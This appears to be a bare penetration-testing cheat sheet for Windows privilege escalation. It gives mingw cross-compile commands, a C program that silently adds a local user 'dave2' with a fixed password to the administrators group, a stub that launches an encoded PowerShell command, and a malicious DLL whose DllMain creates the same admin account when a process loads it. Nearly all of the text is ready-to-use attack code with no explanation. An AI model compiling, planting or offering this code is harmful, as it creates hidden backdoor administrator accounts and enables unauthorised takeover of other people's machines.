```shell
sudo apt install mingw-w64
i686-w64-mingw32-gcc a.c -o a.out
x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll
```

```c
#include <stdlib.h>
int main ()
{
int i;
i = system ("net user dave2 password123! /add");
i = system ("net localgroup administrators dave2 /add");
return 0; }
```

```c
#include <stdio.h>
int main()
{
    system("powershell -enc "); 
    return 0;
}
```



```c
// dll injection
// myDll.cpp
#include <stdlib.h>
#include <windows.h>
BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function LPVOID lpReserved ) // Reserved
{
switch ( ul_reason_for_call )
{
case DLL_PROCESS_ATTACH: // A process is loading the DLL.
int i;
i = system ("net user dave2 password123! /add");
i = system ("net localgroup administrators dave2 /add"); break;
case DLL_THREAD_ATTACH: // A process is creating a new thread. break;
case DLL_THREAD_DETACH: // A thread exits normally.
break;
case DLL_PROCESS_DETACH: // A process unloads the DLL.
break;
}
    return TRUE;
}
```